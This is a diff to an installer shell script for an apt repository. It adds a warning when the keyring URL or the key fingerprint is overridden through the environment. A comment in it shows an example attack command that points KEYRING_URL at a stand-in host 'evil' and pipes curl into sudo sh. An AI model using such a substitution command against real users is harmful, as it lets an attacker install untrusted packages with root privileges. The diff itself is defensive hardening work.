@@ -34,6 +34,29 @@ KEYRING_PATH="/usr/share/keyrings/glyndor.gpg"
 # points at the key when the fault is the spaces.
 GLYNDOR_APT_FPR="${GLYNDOR_APT_FPR:-9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6}"
 
+# Both overrides above exist for forks and both are silent, which is the part
+# worth changing. The attack they enable is not "someone controls your shell" --
+# anyone who does needs no override. It is a copied command line:
+#
+#   KEYRING_URL=http://evil/x.deb GLYNDOR_APT_FPR=DEAD... \
+#     curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh
+#
+# The visible URL is the real one. Everything that would have made the
+# substitution obvious is in the environment, off the end of what a reader
+# checks.
+#
+# Blocking the override would break the fork it was written for, so instead say
+# what is in use. A line on the screen does not stop anyone determined; it
+# removes the case where the substitution is invisible to someone who would have
+# noticed it.
+DEFAULT_URL="https://apt.glyndor.net/glyndor-archive-keyring.deb"
+DEFAULT_FPR="9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6"
+url_overridden=no
+fpr_overridden=no
+[ "$KEYRING_URL" = "$DEFAULT_URL" ] || url_overridden=yes
+[ "$(printf '%s' "$GLYNDOR_APT_FPR" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')" \
+	= "$DEFAULT_FPR" ] || fpr_overridden=yes
+
 fail() {
 	echo "error: $1" >&2
 	exit 1
@@ -76,6 +99,18 @@ if ! command -v gpg >/dev/null 2>&1; then
 fi
 
 workdir=$(mktemp -d)
+
+# Printed after the tool checks, so the message lands on a machine that can act
+# on it rather than scrolling past a "no apt-get found" a moment later.
+if [ "$url_overridden" = yes ] || [ "$fpr_overridden" = yes ]; then
+	echo "NOTE: this is not the stock Glyndor install." >&2
+	[ "$url_overridden" = no ] || echo "  keyring source: $KEYRING_URL (default is $DEFAULT_URL)" >&2
+	[ "$fpr_overridden" = no ] || echo "  expected key:   $GLYNDOR_APT_FPR (default is $DEFAULT_FPR)" >&2
+	if [ "$url_overridden" = yes ] && [ "$fpr_overridden" = yes ]; then
+		echo "  Both were replaced, so nothing here is checked against Glyndor's" >&2
+		echo "  published key. That is correct for a fork and wrong for anything else." >&2
+	fi
+fi
 
 echo "Downloading the archive keyring ..."
 curl -fsSL -o "$workdir/glyndor-archive-keyring.deb" "$KEYRING_URL" \
